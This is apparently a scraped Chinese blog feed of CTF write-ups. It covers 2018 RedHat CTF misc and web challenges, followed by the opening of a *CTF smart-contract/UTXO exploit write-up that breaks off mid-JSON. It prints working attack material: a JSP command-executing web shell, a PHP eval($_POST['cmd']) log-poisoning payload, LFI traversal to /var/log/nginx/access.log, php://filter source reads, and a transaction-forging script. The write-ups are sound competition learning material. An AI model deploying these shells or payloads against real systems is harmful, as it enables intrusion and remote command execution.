os.walk('E:\\\\Download\\\\123'): for one in files: one = one[:-4] file.write(one + '\\n')&emsp;&emsp;然后字典跑一下： &emsp;&emsp;密码：0328fc8b43cb2ddf89ba69fa5e6dbc05。打开后发现word也被加密了。 &emsp;&emsp;再破之： &emsp;&emsp;密码：5693。打开后发现又是解密： &emsp;&emsp;这时我们搜索一下这个文档，接着就能发现线索了。 &emsp;&emsp;注意到曼彻斯特，因为有个曼彻斯特编码的加密方式，然后再去Google了一番，最终发现了i春秋上出过类似的题。123链接： https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=8480&amp;highlight=writeup http://pav1.cc/wordpress/?p=108&emsp;&emsp;如果你直接用i春秋上的脚本跑，结果是错的，然后在第二条链接上发现了曼彻斯特编码另一种解码方式。所以最终的payload：123456789101112131415161718#-*- coding:utf-8 -*-n=0x123654AAA678876303555111AAA77611A321flag=''bs='0'+bin(n)[2:]r=''def conv(s): return hex(int(s,2))[2:]for i in range(0,len(bs),2): if bs[i:i+2]=='01': r+='0' # 调换下 0/1 else: r+='1'for i in range(0,len(r),8): tmp=r[i:i+8][::-1] flag+=conv(tmp[:4]) flag+=conv(tmp[4:])print flag.upper()&emsp;&emsp;flag：flag{5EFCF5F507AA5FAD77}。## Web### simple upload&gt;这次在你面前的网站的功能非常简单，接受挑战吧！&emsp;&emsp;在抓包的时候发现了admin=0，将其改成1就可以任意登录了。 &emsp;&emsp;这道题让我误会了是php的，还是在上传已存在的文件的时候报出来的错误才让我明白这是jsp。这道题考的真的是细心了。 &emsp;&emsp;而且服务器只检查了Content-Type: image/jpeg，其他都没有过滤。所以找个jsp一句话。1234567891011121314&lt;% // pwd是密码 // cmd是要执行的命令 if(\"xxx\".equals(request.getParameter(\"pwd\"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\"&lt;pre&gt;\"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\"&lt;/pre&gt;\"); }%&gt;&emsp;&emsp;上传后如下访问即可：1http://a65af4fd5dd746c5a742b7c50ed19b4d3fa1fff3ba564ccd.game.ichunqiu.com/03e66dd9-edae-4db6-b504-5a1be6114385/shell.jsp?pwd=xxx&amp;cmd=ls%20../&emsp;&emsp;最终flag：flag{5450ef7a-4e88-444d-afdd-7e3ebeca1c85}。### shopping log1234http://123.59.141.153/或者 http://120.132.95.234/hint: 不需要注入hint2：订单号从0000开始试可能不是一个明智的选择&emsp;&emsp;打开后在源代码中发现如下注释：1&lt;!-- Site is tmvb.com --&gt;&emsp;&emsp;这道题尝试了挺久，用过Site: tmvb.com的请求头还有X-Forwarded-For、X-Forwarded-Host，但都没用，然后只能去看看http请求头的字段说明了，然后可以找到一个：1Host 指定请求的服务器的域名和端口号 Host: www.zcmhi.com&emsp;&emsp;然后使用Host: tmvb.com就过了。 &emsp;&emsp;这个就用Referer: www.dww.com/123绕过了。 &emsp;&emsp;这个猜测是接收的语言，因为标题那有la，找了下japen的形式。 &emsp;&emsp;所以再增加：Accept-Language: ja，这下就直接进去了。 &emsp;&emsp;手工试了1~10但都没发现，然后想到hint里的从0000开始试可能不是一个明智的选择，所以考虑从9999往前。这里又手工了一会，发现没办法，只能写脚本跑了。脚本如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465# -*-coding:utf-8 -*-import requestsimport reimport hashlibm5 = []def md5(s): return hashlib.md5(s).hexdigest()def creat(): for i in range(1000, 9999999): one = md5(str(i)) m5.append(one)creat()def find(s): for ix,one in enumerate(m5): if one.startswith(s): return ix + 1 return Noneurl = 'http://120.132.95.234/5a560e50e61b552d34480017c7877467info.php'headers = { 'Host':'www.tmvb.com', 'Referer':'www.dww.com/123', 'Accept-Language':'ja'}sess = requests.session()start = 10000for o in range(1,9999): order = start - o print(order) html = sess.get(url,headers=headers) reg = re.compile('=== \\'(.*)\\'') text = html.text code = re.findall(reg,text)[0] print(code) results = find(code) while results == None: # 没有找到时就刷新code，直到找着。 html = sess.get(url, headers=headers) reg = re.compile('=== \\'(.*)\\'') text = html.text code = re.findall(reg, text)[0] results = find(code) print('code', results) url2 = 'http://120.132.95.234/api.php?action=report' data = { 'TxtTid':order, 'code':results } # proxy = {'http':'http://127.0.0.1:8080'} html = sess.post(url2, data=data,headers=headers) ok = html.text print(ok) if 'no such order' not in ok: print('ok!!!') print(order) break&emsp;&emsp;这里参考了彩虹表的思想，先将一堆md5保存下来，要用的时候就直接找了，就不用现爆了。这里也考虑空间换时间的策略，首先生成了从1000~9999999的md5，因为单个碰撞也是用的这个范围，但从实际情况看范围再小点也是可以的，因为程序运行的时候数据是放在内存的，所以要考虑实际的内存大小，上面脚本在我本机上需要1G左右的内存。&emsp;&emsp;这里如果采用来一个爆破一个的话效率就太低了，而且每次计算的md5都是一样的，这就造成了资源的浪费，但就算上面这个脚本爆破的时间也是挺长的。&emsp;&emsp;另一个策略就是当没有在预存的md5中找到满足条件的值得时候，我是采用再次刷新的方法，这样就能保证总能通过验证。&emsp;&emsp;最终order的值是：9588，flag：flag{hong_mao_ctf_hajimaruyo}。### biubiubiu&gt; 这次在你面前的网站看起来很复杂，接受挑战吧！&emsp;&emsp;打开网站如下： &emsp;&emsp;看到?page=就想到php://filter读取源码，使用：1?page=php://filter/convert.base64-encode/resource=index.php&emsp;&emsp;我们就能得到index.php的源码，接着我们再读取其他的文件。最后所有的文件如下：12345678910111213141516&lt;?php// index.php if(isset($_GET['page'])) { $file = $_GET['page']; if(strpos($file,\"read\")){ header(\"Location: index.php?page=login.php\"); exit(); } include($file); } else{ header(\"Location: index.php?page=login.php\"); }?&gt;123456789101112131415161718&lt;?php// send.phpif (@$_POST['url']) { $url = @$_POST['url']; if(preg_match(\"/^http(s?):\\/\\/.+/\", $url)){ $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, True); curl_setopt($ch,CURLOPT_REDIR_PROTOCOLS,CURLPROTO_GOPHER|CURLPROTO_HTTP|CURLPROTO_HTTPS); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch);}}?&gt;1234567891011&lt;?php// login.php session_start(); #include_once(\"conn.php\"); if(isset($_POST[\"email\"])&amp;&amp;isset($_POST[\"password\"])){ $_SESSION['login']=1; header(\"Location: index.php?page=send.php\"); exit(); }?&gt;123456789101112&lt;?php// conn.php$db_host = 'mysql';$db_name = 'user_admin';$db_user = 'Dog';$db_pwd = '';$conn = mysqli_connect($db_host, $db_user, $db_pwd, $db_name);if(!$conn){ die(mysqli_connect_error());}12345678# users.sqlDROP TABLE IF EXISTS `admin`;CREATE TABLE `admin` ( `id` int(10) unsigned NOT NULL AUTO_INCREMENT, `username` varchar(32) DEFAULT NULL, `password` varchar(43) DEFAULT NULL, PRIMARY KEY (`id`)) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;&emsp;&emsp;可以确定，?page=存在文件包含漏洞，而且可以任意读系统文件。 &emsp;&emsp;这里自己跑偏了一晚上，把考点放在了gopher协议的攻击利用上了。试过gopher + fastcgi生成shell和基于ssrf的gopher + mysql攻击利用，但都没有结果，但gopher确实是可用的。由于实验的vps已经被我删掉了，所以这里就单mark一下。1234参考链接：http://drops.xmd5.com/static/drops/tips-16590.htmlhttp://www.4o4notfound.org/index.php/archives/33/http://www.freebuf.com/articles/web/159342.html&emsp;&emsp;发现上面的思路错了后，又回头看文件包含了，想到文件包含一般是配合文件上传使用的，但在这道题的环境中并没有发现有上传的地方。然后Google了一下文件包含，发现还可以包含日志，再想到我们能任意读系统文件。那么攻击手法就出来了。&emsp;&emsp;这里需要注意的是不能直接在地址栏访问，因为这样会对URL进行url编码，待会包含的时候就不能解析。如： &emsp;&emsp;在日志中结果是： &emsp;&emsp;可以看到，这样就不能识别为&lt;?php xxx ?&gt;了。&emsp;&emsp;正确的做法是在send.php里请求：1http://bb37664e6549424c88750e9f2dd7c0de62213b7e29f343be.game.ichunqiu.com/&lt;?php phpinfo(); ?&gt;/&emsp;&emsp;这样会在日志文件中（/var/log/nginx/access.log）里产生日志，然后把他包含进来，请求：1http://bb37664e6549424c88750e9f2dd7c0de62213b7e29f343be.game.ichunqiu.com/index.php?page=../../../var/log/nginx/access.log &emsp;&emsp;然后我们再生成一句话：1http://bb37664e6549424c88750e9f2dd7c0de62213b7e29f343be.game.ichunqiu.com/&lt;?php echo &apos;ok&apos;;eval($_POST[&apos;cmd&apos;]); ?&gt;/ &emsp;&emsp;用菜刀连接 &emsp;&emsp;翻了一下目录没有找到flag相关的信息，再考虑给出的users.sql和数据库配置文件conn.php，决定看看数据库，不过我们需要配置一下。 &emsp;&emsp;最后找到flag： &emsp;&emsp;flag：flag{dbc98dd7-90fb-44f4-8dbe-35a72f07ec9d}。&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;","link":"/2018/05/redhat-writeup/"},{"title":"2018 *CTF/starCTF Smart? Contract writeup","text":"目录 一：前言 二：染色币 三：智能合约 四：漏洞原理 五：漏洞利用 六：总结 前言&emsp;&emsp;这个题我一直想着复现，但也一直拖着，其中也有writeup难找的原因，那个*真是坑爹中的坑爹，直接被Google当成了通配符，好在跟大佬求了份writeup，终于可以学习学习。首先放出参加DDCTF2018颁奖的时候出题人放的解题思路： &emsp;&emsp;从这个PPT里我们也能一窥解题的思路，我们还是先从理论基础知识讲起。## 染色币&emsp;&emsp;定义：&gt;染色币是指一组使用比特币交易记录比特币以外的外部资产的创建，所有权和转让的类似技术。“外在”是指不直接存储在比特币区块链中的资产，而不是比特币本身，这是区块链固有的资产。&emsp;&emsp;作者粗略的理解就是在比特币上增加额外的功能，比如在人民币1元钱的上面增加一个股权信息，或者增加这可以抵换1美元的信息，当然这个附加信息还可以是其他的。这样我们用那染色的人民币1元钱进行交易时也把附加的股权给转让出去了。这样做的一个好处就是将虚拟货币增加了实体有形的资产。&emsp;&emsp;而题目中的染色区是在extra字段，它这里增加了token，并且提供了从token到StarCoins的转换功能。 智能合约&emsp;&emsp;在区块链上运行的程序，通常称为智能合约（Smart Contract）。这个程序就像一个可以被信任的人，可以临时保管资产，并且总是按照事先约定的规则执行操作。执行的过程中不受人为控制。题目中的SRC20SmartContract智能合约制定了两个功能：购买和赎回，并且在赎回 starcoins的时候自动拿出银行的私钥进行签名，以保证交易的正确性。这就导致了只要我们tokens足够，我们就能提出任意多的starcoins，这也是下面漏洞利用的前提。 &emsp;&emsp;对于合约安全，我们应该多注意合约实现的逻辑问题，因为合约本身就是一个逻辑的处理过程，只不过是用程序语言表达出来而已。 漏洞原理&emsp;&emsp;对于一个writeup，先说明漏洞的产生原理会对读者的理解起到一个很好的帮助，所以这里先说一下此题的漏洞原理。这里参考了Henryzhao大佬的writeup，也非常感谢大佬的指点。 &emsp;&emsp;首先我们知道有两个功能函数：购买和赎回starcoins。并且会在交易的时候检查input里的tokens/starcoins余额是否足够，如果足够则交易成功，反之失败。我们的目标是得到200个StarCoins，很显然，我们需要找到一个漏洞让我们的100 StarCoins变成200个。而这道题就是在计算tokens余额的方法上存在漏洞，具体如下： &emsp;&emsp;注意到它进行了del utxo操作，它默认output id和input id相同的utxo是一样的，这样为了减少计算就可以把output出来的ID在input里删去，从而造成了这个漏洞。 漏洞利用&emsp;&emsp;下面详细说一下漏洞的细节，我们可以简单的认为这里有两个账本，一个是tokens，一个是starcoins，所以对于每一步交易我们都应该同时记录tokens和starcoins的变化，当我们执行完购买、赎回后，所产生的账单如下（这里还是借用Henryzhao大佬的表）： Step Operation My Coins Bank Coins My Tokens Bank Tokens Comment 1 Init 100 200 0 9999 2 Buy 100 Token 0 300 100 9999 Using the initial utxo of 100 Coins 3 Withdraw 100 Token 100 200 0 9999 Using the utxo of buying the Token in step 2 &emsp;&emsp;此时所有的utxo如下：12345678910111213141516171819202122232425262728{ \"1f7ab476-00dc-4cf2-b7e9-b82b8cb83bf4\": { \"id\": \"1f7ab476-00dc-4cf2-b7e9-b82b8cb83bf4\", \"amount\": 0, \"hash\": \"9ce516a92ae1eaf302af93b0183f5c3bd4f1d9e0253cdb83940937bf8ad98619\", \"addr\": \"885a66372ff02f9697aabf2e280684066c3024385bdcf56cfc6da1d05d86cb12ebd867fe63e546b6850f1ef0c4dc6a4d\", \"extra\": \"4804944d429db348a56bdcd75ae5064603917063e484b47d96f7f19b7baaeb417320be64883ff296cda0a588e78d1cdc$$${\\\"tokenNum\\\": -100, \\\"utxo_id\\\": \\\"1f7ab476-00dc-4cf2-b7e9-b82b8cb83bf4\\\"}\" }, \"071a33e4-95be-4d06-921c-9aca4f43f6bd\": { \"id\": \"071a33e4-95be-4d06-921c-9aca4f43f6bd\", \"amount\": 0, \"hash\": \"ee71b83bd19926d1565b9221fac364211b712e625509c8ffe77ac1954d4ad882\", \"addr\": \"885a66372ff02f9697aabf2e280684066c3024385bdcf56cfc6da1d05d86cb12ebd867fe63e546b6850f1ef0c4dc6a4d\", \"extra\": \"14d6d4b5536cb4791ba546f4b94cd1e4464fdbcec6f3dcf1fae2ecb69713dd21371ab93869ce54bfbce755b13614490d$$${\\\"tokenNum\\\": 100, \\\"utxo_id\\\": \\\"071a33e4-95be-4d06-921c-9aca4f43f6bd\\\"}\" }, \"be4fb3ca-4cdb-4bcc-8f5b-2cbe0b307e01\": { \"amount\": 200, \"hash\": \"bcb9c319ba2eb3c7f2bb24a4119b819cddd2b27f732628d07f69232cc7af9a7f\", \"addr\": \"990da5a0ccd7c610f45316d7de526f6e5a8eb0e7172c0049abd57cd77ade4c5daca55487024096ea727b2329bb26c481\", \"id\": \"be4fb3ca-4cdb-4bcc-8f5b-2cbe0b307e01\" }, \"cc220143-4532-4bfc-9cea-0cae95231efb\": { \"amount\": 100, \"hash\": \"417c4bc8ee752db2d276fe6bb1e06c8dd630b5b235756aa7ef9aa5da0dcef4e8\", \"addr\": \"885a66372ff02f9697aabf2e280684066c3024385bdcf56cfc6da1d05d86cb12ebd867fe63e546b6850f1ef0c4dc6a4d\", \"id\": \"cc220143-4532-4bfc-9cea-0cae95231efb\" }} &emsp;&emsp;注意到1f7ab476-00dc-4cf2-b7e9-b82b8cb83bf4的tokenNum是-100，这样在计算startokens的时候就是：100 + (-100) = 0，从而得到当前黑客剩余的余额：12345// StarTokens balance of all addresses{ \"990da5a0ccd7c610f45316d7de526f6e5a8eb0e7172c0049abd57cd77ade4c5daca55487024096ea727b2329bb26c481\": 999999999, \"885a66372ff02f9697aabf2e280684066c3024385bdcf56cfc6da1d05d86cb12ebd867fe63e546b6850f1ef0c4dc6a4d\": 0} &emsp;&emsp;因为当前startokens的余额为0，所以无法再进行赎回操作。但是此时我们联想起上面他对utxo统计的逻辑，如果我们用1f7ab476-00dc-4cf2-b7e9-b82b8cb83bf4作为一个tx的input id，那么就会因为这个id已经在output里，导致它进行del utxo操作，这样下面这个块就被擦除了：123456789{ \"1f7ab476-00dc-4cf2-b7e9-b82b8cb83bf4\": { \"id\": \"1f7ab476-00dc-4cf2-b7e9-b82b8cb83bf4\", \"amount\": 0, \"hash\": \"9ce516a92ae1eaf302af93b0183f5c3bd4f1d9e0253cdb83940937bf8ad98619\", \"addr\": \"885a66372ff02f9697aabf2e280684066c3024385bdcf56cfc6da1d05d86cb12ebd867fe63e546b6850f1ef0c4dc6a4d\", \"extra\": \"4804944d429db348a56bdcd75ae5064603917063e484b47d96f7f19b7baaeb417320be64883ff296cda0a588e78d1cdc$$${\\\"tokenNum\\\": -100, \\\"utxo_id\\\": \\\"1f7ab476-00dc-4cf2-b7e9-b82b8cb83bf4\\\"}\" }} &emsp;&emsp;这样再进行余额检查的时候就是：100 + 0 = 100(startokens)，此时我们再进行购买100startokens，那么我们总共就会有：100 + 100 = 200(startokens)，接着我们将这200startokens进行赎回，最终我们能得到200 starcoins。 &emsp;&emsp;理解了这一点后我们就能比较好的理解Henryzhao大佬的整个表了： Step Operation My Coins Bank Coins My Tokens Bank Tokens Comment 1 Init 100 200 0 9999 2 Buy 100 Token 0 300 100 9999 Using the initial utxo of 100 Coins 3 Withdraw 100 Token 100 200 0 9999 Using the utxo of buying the Token in step 2 4 Transfer 0 coin from me to me 100 200 100 9999 Using the generated utxo in step 3, contains -100 Tokens 5 Buy 100 Token 0 300 200 9999 Using the uxto of withdrawing 100 Coins in step 3 6 Withdrawal 200 Token 200 100 0 9999 &emsp;&emsp;特别提示下，在step 4的id是包含了-100 tokens的那个utxo的id，如下： &emsp;&emsp;因为我们的目的是擦除-100 tokens，所以要用那个块作为input。 &emsp;&emsp;下面是作者自己写的半自动化脚本，这也方便一开始的理解，需要注意的是，使用脚本的时候需要一步一步走，step 2的参数需要你手动将step 1执行完的结果进行输入，如果想学习全自动化脚本，请移步官方writeup，作者的脚本如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167# -*- coding: utf-8 -*-import json, uuid, hashlib,rsa,pickleimport random,stringEMPTY_HASH = '0' * 64DIFFICULTY = int('00000' + 'f' * 59, 16)def hash(x): return hashlib.sha256(hashlib.md5(x).digest()).hexdigest()def hash_reducer(x, y): return hash(hash(x) + hash(y))def sign_input_utxo(input_utxo_id, privkey): return rsa.sign(input_utxo_id, privkey, 'SHA-1').encode('hex')# 对 output 进行hashdef hash_utxo(utxo): return reduce(hash_reducer, [utxo['id'], utxo['addr'], str(utxo['amount'])])def create_output_utxo(addr_to, amount): utxo = {'id': str(uuid.uuid4()), 'addr': addr_to, 'amount': amount} utxo['hash'] = str(hash_utxo(utxo)) return utxo# 对 transactions 进行hashdef hash_tx(tx): return reduce(hash_reducer, [ reduce(hash_reducer, tx['input'], EMPTY_HASH), reduce(hash_reducer, [utxo['hash'] for utxo in tx['output']], EMPTY_HASH) ])#对整个块 hashdef hash_block(block): return reduce(hash_reducer, [block['prev'], block['nonce'], reduce(hash_reducer, [tx['hash'] for tx in block['transactions']], EMPTY_HASH)])bank_address = '990da5a0ccd7c610f45316d7de526f6e5a8eb0e7172c0049abd57cd77ade4c5daca55487024096ea727b2329bb26c481'# 赎回的时候用我们的地址my_address = '885a66372ff02f9697aabf2e280684066c3024385bdcf56cfc6da1d05d86cb12ebd867fe63e546b6850f1ef0c4dc6a4d'privkey = \"63636f70795f7265670a5f7265636f6e7374727563746f720a70300a28637273612e6b65790a507269766174654b65790a70310a635f5f6275696c74696e5f5f0a6f626a6563740a70320a4e7470330a5270340a284c32303938363636363237303537323732343838373030383730323036363732333136393238303137323032343534343938313032363737323634363839323131323835363837373831323038303136313038313237383037383133393437363432373033333630333437323031333135383938394c0a4936353533370a4c31323437333737323233393135363830323330323837373030303334343932303639353337373733333831323533343931333830333432353937303731363138333937373239373030383935393937393035363631393636323538343335343331303337323633303536353930303439333035334c0a4c31393137383739323838363234353439363834343231363735363631343935323633323537323137333231353630393833363838363031323638343937394c0a4c313039343236343139303430323932303737373532303136373639353739373330323733383036313232343832303334393033323139314c0a4c353235383136373931343030333637383634343037373138383139363835373738383736313431343239303231383932323838353831383333303436354c0a4c3135333439343532353236363234373332313437383539383337333835363937353531313130303535313434303736353830363338334c0a4c31353233353733313234323832353338343731393937363436383035313739363834393833383638343332333536373932373431343938363239393433334c0a7470350a622e\"tmp_privkey = pickle.loads(privkey.decode('hex')) # 进行解码### step1: 购买 100 tokens# 创世块/上一块中的 output 里的IDinput_id = \"d924f0db-0b46-4c93-8c8e-3d83291c83a2\"prev = \"41bc26b103e779479118b5b315d944e5eb785563870acccb39bd71d8d417d89a\"signature = [sign_input_utxo(input_id, tmp_privkey)]output = [create_output_utxo(bank_address,100)]transactions = { \"input\": [input_id], \"signature\":signature, \"output\":output, \"call_smart_contract\":'buyTokens'}# 对 transactions 进行签名hash_transactions = hash_tx(transactions)transactions['hash'] = str(hash_transactions)block = { \"prev\":prev, \"transactions\":[transactions], \"nonce\" : \"step1\"}block['hash'] = str(hash_block(block))print(json.dumps(block))### step2: 赎回prev = \"860aa2c3c1ab16ba0378498165b3a6a75662a2c4847cf9532a46b3257cc80d2d\"# 购买tokens时转给银行的 idinput_id = 'bf722709-bbea-406d-9486-4b259444dec8'output = [create_output_utxo(my_address,100)]transactions = { \"input\": [input_id], \"signature\":[], \"output\":output, \"call_smart_contract\":'withdraw'}# 对 transactions 进行签名hash_transactions = hash_tx(transactions)transactions['hash'] = str(hash_transactions)block = { \"prev\":prev, \"transactions\":[transactions], \"nonce\" : \"step2\"}block['hash'] = str(hash_block(block))print(json.dumps(block))### step3: 转 0 给自己prev = \"861dadc278df24efb3e9dfab420a4137f7c933cd93d27a0980eb843735341b30\"# -100 tokennum 的 input_idinput_id = '1f7ab476-00dc-4cf2-b7e9-b82b8cb83bf4'output = [create_output_utxo(my_address,0)]signature = [sign_input_utxo(input_id, tmp_privkey)]transactions = { \"input\": [input_id], \"signature\":signature, \"output\":output,}# 对 transactions 进行签名hash_transactions = hash_tx(transactions)transactions['hash'] = str(hash_transactions)block = { \"prev\":prev, \"transactions\":[transactions], \"nonce\" : \"step3\"}block['hash'] = str(hash_block(block))print(json.dumps(block))### step4: 再购买 100 tokens# 使用 上面赎回来的 input_idinput_id = \"cc220143-4532-4bfc-9cea-0cae95231efb\"prev = \"4149dafccdb394829022055ef59e572d558d7cdb62a4e4ea47b4e630ef4a2c43\"signature = [sign_input_utxo(input_id, tmp_privkey)]output = [create_output_utxo(bank_address,100)]transactions = { \"input\": [input_id], \"signature\":signature, \"output\":output, \"call_smart_contract\":'buyTokens'}# 对 transactions 进行签名hash_transactions = hash_tx(transactions)transactions['hash'] = str(hash_transactions)block = { \"prev\":prev, \"transactions\":[transactions], \"nonce\" : \"step4\"}block['hash'] = str(hash_block(block))print(json.dumps(block))### step5: 现在有 200个tokens，直接赎回prev = \"cc396f7b9265af9ca39a54dad473cead6e1f5f46adcb357427b1f6b159c6f720\"# 一开始发行的银行里的 200中的input_idinput_id = 'be4fb3ca-4cdb-4bcc-8f5b-2cbe0b307e01'output = [create_output_utxo(my_address,200)] # 转200transactions = { \"input\": [input_id], \"signature\":[], \"output\":output, \"call_smart_contract\":'withdraw'}# 对 transactions 进行签名hash_transactions = hash_tx(transactions)transactions['hash'] = str(hash_transactions)block = { \"prev\":prev, \"transactions\":[transactions], \"nonce\" : \"step5\"}block['hash'] = str(hash_block(block))print(json.dumps(block)) &emsp;&emsp;为了方便读者对比，我提供了整个流程的区块链结构和utxos。下面是整个流程走完得到的区块链：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153{ \"cc396f7b9265af9ca39a54dad473cead6e1f5f46adcb357427b1f6b159c6f720\": { \"nonce\": \"step4\", \"prev\": \"4149dafccdb394829022055ef59e572d558d7cdb62a4e4ea47b4e630ef4a2c43\", \"hash\": \"cc396f7b9265af9ca39a54dad473cead6e1f5f46adcb357427b1f6b159c6f720\", \"transactions\": [ { \"call_smart_contract\": \"buyTokens\", \"input\": [ \"cc220143-4532-4bfc-9cea-0cae95231efb\" ], \"signature\": [ \"2e3394dc0adf2ef0b5537540d8429f9621ff23534002566818b675acd5c6a5edd269dfe67281f6dd3e2d51498953f061\" ], \"hash\": \"05521a130db3bb9262380330e914a03abca4497ab9d0733606149b3d02a6e900\", \"output\": [ { \"amount\": 100, \"hash\": \"4beb7b7d7ded41cb904faeb550f32336c0bd6b9873ceec50e859e2774929a6a5\", \"addr\": \"990da5a0ccd7c610f45316d7de526f6e5a8eb0e7172c0049abd57cd77ade4c5daca55487024096ea727b2329bb26c481\", \"id\": \"4ca03386-e345-40b0-a197-5aa8fa8b36ba\" }, { \"id\": \"7e82a104-6d3b-4e53-8f07-c7211bbe872a\", \"amount\": 0, \"hash\": \"3ddfa82c48b68cd088e38acbe149eafb95d2e530bb2c894f47a49ba43f92c3f6\", \"addr\": \"885a66372ff02f9697aabf2e280684066c3024385bdcf56cfc6da1d05d86cb12ebd867fe63e546b6850f1ef0c4dc6a4d\", \"extra\": \"7534ef9e99494d752f67eb6416164888433d3f79ba5679a8de42035054e0a3dc371c7457309ce96d86ed1281d533e06a$$${\\\"tokenNum\\\": 100, \\\"utxo_id\\\": \\\"7e82a104-6d3b-4e53-8f07-c7211bbe872a\\\"}\" } ] } ], \"height\": 4 }, \"860aa2c3c1ab16ba0378498165b3a6a75662a2c4847cf9532a46b3257cc80d2d\": { \"nonce\": \"step1\", \"prev\": \"41bc26b103e779479118b5b315d944e5eb785563870acccb39bd71d8d417d89a\", \"hash\": \"860aa2c3c1ab16ba0378498165b3a6a75662a2c4847cf9532a46b3257cc80d2d\", \"transactions\": [ { \"call_smart_contract\": \"buyTokens\", \"input\": [ \"d924f0db-0b46-4c93-8c8e-3d83291c83a2\" ], \"signature\": [ \"1983a3034b4e07021c8e94205778904eef0679aa16fbc56cd205ea5fc64c23f7cf21acd760799b35f5932325cc30afe2\" ], \"hash\": \"e3bdf5c0ca4d3fa741c6c6d7f56bd63dd9f1d61e44c872c1dfed8a886f55c828\", \"output\": [ { \"amount\": 100, \"hash\": \"5ef33d8805fecff8e01cd11d4806307bf070d4ee0bfd1eb7a7185fe95c99b698\", \"addr\": \"990da5a0ccd7c610f45316d7de526f6e5a8eb0e7172c0049abd57cd77ade4c5daca55487024096ea727b2329bb26c481\", \"id\": \"bf722709-bbea-406d-9486-4b259444dec8\" }, { \"id\": \"071a33e4-95be-4d06-921c-9aca4f43f6bd\", \"amount\": 0, \"hash\": \"ee71b83bd19926d1565b9221fac364211b712e625509c8ffe77ac1954d4ad882\", \"addr\": \"885a66372ff02f9697aabf2e280684066c3024385bdcf56cfc6da1d05d86cb12ebd867fe63e546b6850f1ef0c4dc6a4d\", \"extra\": \"14d6d4b5536cb4791ba546f4b94cd1e4464fdbcec6f3dcf1fae2ecb69713dd21371ab93869ce54bfbce755b13614490d$$${\\\"tokenNum\\\": 100, \\\"utxo_id\\\": \\\"071a33e4-95be-4d06-921c-9aca4f43f6bd\\\"}\" } ] } ], \"height\": 1 }, \"4149dafccdb394829022055ef59e572d558d7cdb62a4e4ea47b4e630ef4a2c43\": { \"nonce\": \"step3\", \"prev\": \"861dadc278df24efb3e9dfab420a4137f7c933cd93d27a0980eb843735341b30\", \"hash\": \"4149dafccdb394829022055ef59e572d558d7cdb62a4e4ea47b4e630ef4a2c43\", \"transactions\": [ { \"input\": [ \"1f7ab476-00dc-4cf2-b7e9-b82b8cb83bf4\" ], \"signature\": [ \"81c958e5df32248f779d9d1aa50e44f50e786729178e235b3bcc6d0248bd402cd2c7e38874e5c74938b1c640a6b0fdef\" ], \"hash\": \"dbd16f5af0794539a9bc6c1f0466920855a35316817b3ed9de6d4990a93b6bab\", \"output\": [ { \"amount\": 0, \"hash\": \"94f41f448309e57220a2c3d25dec3d0bf21258014dbef8554702daf3a6030dcd\", \"addr\": \"885a66372ff02f9697aabf2e280684066c3024385bdcf56cfc6da1d05d86cb12ebd867fe63e546b6850f1ef0c4dc6a4d\", \"id\": \"ba2c9e75-cd1d-4d8b-9144-98fac2a3f6f2\" } ] } ], \"height\": 3 }, \"861dadc278df24efb3e9dfab420a4137f7c933cd93d27a0980eb843735341b30\": { \"nonce\": \"step2\", \"prev\": \"860aa2c3c1ab16ba0378498165b3a6a75662a2c4847cf9532a46b3257cc80d2d\", \"hash\": \"861dadc278df24efb3e9dfab420a4137f7c933cd93d27a0980eb843735341b30\", \"transactions\": [ { \"call_smart_contract\": \"withdraw\", \"input\": [ \"bf722709-bbea-406d-9486-4b259444dec8\" ], \"signature\": [ \"71e0f8ee912afda2f92f21c923651d65ddd1a18882b2d1841d9b29ee73d5f3fb669fa938fa1ad3158b6ab71d0cc5c51b\" ], \"hash\": \"9853e97de2fe47a1967a658981fb5407d53923632b2c18cbf1110e373737cce8\", \"output\": [ { \"amount\": 100, \"hash\": \"417c4bc8ee752db2d276fe6bb1e06c8dd630b5b235756aa7ef9aa5da0dcef4e8\", \"addr\": \"885a66372ff02f9697aabf2e280684066c3024385bdcf56cfc6da1d05d86cb12ebd867fe63e546b6850f1ef0c4dc6a4d\", \"id\": \"cc220143-4532-4bfc-9cea-0cae95231efb\" }, { \"id\": \"1f7ab476-00dc-4cf2-b7e9-b82b8cb83bf4\", \"amount\": 0, \"hash\": \"9ce516a92ae1eaf302af93b0183f5c3bd4f1d9e0253cdb83940937bf8ad98619\", \"addr\": \"885a66372ff02f9697aabf2e280684066c3024385bdcf56cfc6da1d05d86cb12ebd867fe63e546b6850f1ef0c4dc6a4d\", \"extra\": \"4804944d429db348a56bdcd75ae5064603917063e484b47d96f7f19b7baaeb417320be64883ff296cda0a588e78d1cdc$$${\\\"tokenNum\\\": -100, \\\"utxo_id\\\": \\\"1f7ab476-00dc-4cf2-b7e9-b82b8cb83bf4\\\"}\" } ] } ], \"height\": 2 }, \"41bc26b103e779479118b5b315d944e5eb785563870acccb39bd71d8d417d89a\": { \"nonce\": \"The Times 03/Jan/2009 Chancellor on brink of second bailout for bank\", \"prev\": \"0000000000000000000000000000000000000000000000000000000000000000\", \"hash\": 